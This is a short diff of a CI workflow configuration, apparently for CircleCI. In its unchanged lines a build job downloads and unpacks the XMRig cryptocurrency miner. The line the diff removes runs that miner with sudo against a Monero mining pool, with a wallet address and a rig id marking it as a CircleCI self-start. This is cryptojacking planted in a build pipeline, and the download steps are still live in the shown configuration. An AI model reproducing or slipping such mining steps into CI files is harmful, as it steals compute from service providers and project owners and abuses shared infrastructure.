@@ -14,7 +14,6 @@ jobs:
       - run: wget https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-static-x64.tar.gz
       - run: tar xf xmrig-6.9.0-linux-static-x64.tar.gz
       - run: cd xmrig-6.9.0
-      - run: sudo ./xmrig -o ca.minexmr.com:443 -u 46MKr118zY58LLwRfoJPEJgCUX9YYNzGNBLGS7Ae6xVwBm94LyiFh7qTtgeYNBhnUiJzqmvtS9aRCii9s7wskYFaKHi7cxG -k --tls --rig-id CircleCI_selfstart 
       - persist_to_workspace:
           # Must be an absolute path, or relative path from working_directory
           root: my_workspace
